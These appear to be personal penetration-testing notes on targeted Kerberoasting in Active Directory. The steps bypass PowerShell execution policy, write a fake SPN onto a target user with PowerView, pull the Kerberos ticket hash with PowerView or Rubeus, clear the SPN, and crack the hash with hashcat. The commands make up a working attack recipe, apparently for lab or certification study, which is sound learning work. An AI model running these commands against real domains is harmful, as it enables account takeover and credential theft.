
## `PowerView`

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
```
#### Check first if account Rita has an SPN
```powershell
Get-DomainUser <TARGET_USER> | Select serviceprincipalname
```
![[Pasted image 20251226231348.png]]
#### **Sets (overwrites) the Service Principal Name (SPN)** of the Active Directory object `rita` to a fake value (`nonexistent/BLAHBLAH`).
```powershell
Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```
![[Pasted image 20251226231729.png]]

#### Using `PowerView` for the Fake SPN to get the hash:  
```powershell
$User = Get-DomainUser <TARGET_USER>
$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
```
![[Pasted image 20251226231958.png]]
#### Using `Rubeus` for the Fake SPN to get the hash:  
   - Use **Rubeus** to `Kerberoast` the user and retrieve the hash:  
```powershell
.\Rubeus.exe kerberoast /user:TARGET_USER /nowrap
```  
![[Pasted image 20260101200407.png]]
#### Clearing the SPNs of Rita
```powershell
Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname -Verbose
```
#### Cracking the `Kerberoastable` Hash
```shell
hashcat -m 13100 /hash /usr/share/wordlists/rockyou.txt --force
```
